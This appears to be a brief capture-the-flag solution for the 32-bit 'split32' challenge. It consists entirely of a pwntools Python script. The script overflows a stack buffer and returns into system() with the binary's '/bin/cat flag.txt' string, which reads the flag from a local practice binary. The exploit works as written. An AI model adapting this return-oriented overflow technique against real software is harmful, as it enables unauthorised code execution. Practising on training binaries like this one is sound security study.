# split32

Exp:
```python
import pwn
  
pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./split32')
e = pwn.ELF('./split32')

system_addr = pwn.p32(e.plt['system'])
sh_addr = pwn.p32(next(e.search(b'/bin/cat flag.txt')))

payload = b'A' * 0x28 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr

p.sendlineafter(b'> ', payload)

p.recv()
p.recv()
```